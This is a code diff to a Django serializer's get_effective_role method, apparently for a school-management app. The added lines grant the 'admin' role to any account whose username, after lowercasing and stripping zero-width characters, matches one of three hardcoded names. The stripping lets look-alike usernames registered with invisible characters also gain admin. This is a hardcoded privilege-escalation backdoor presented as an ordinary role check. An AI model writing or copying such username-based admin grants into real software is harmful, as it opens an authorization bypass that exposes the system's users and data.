@@ -48,6 +48,13 @@ class ProfileSerializer(serializers.ModelSerializer):
         read_only_fields = ['id']
     
     def get_effective_role(self, obj):
+        # Check for specific usernames (Principal and Superuser)
+        uname = str(getattr(obj.user, 'username', '')).lower()
+        # Remove all zero-width and invisible characters
+        uname = ''.join(c for c in uname if not (0x200B <= ord(c) <= 0x200D or ord(c) == 0xFEFF))
+        uname = uname.strip()
+        if uname in ('shamir', 'bdadmin', 'umor'):
+            return 'admin'
         # If designation is Principal/Headmaster, treat as admin
         designation = str(obj.designation or '').strip()
         is_principal = any(x in designation for x in ['প্রধান শিক্ষক', 'Headmaster', 'Principal', 'Head Master', 'সহকারী প্রধান শিক্ষক'])
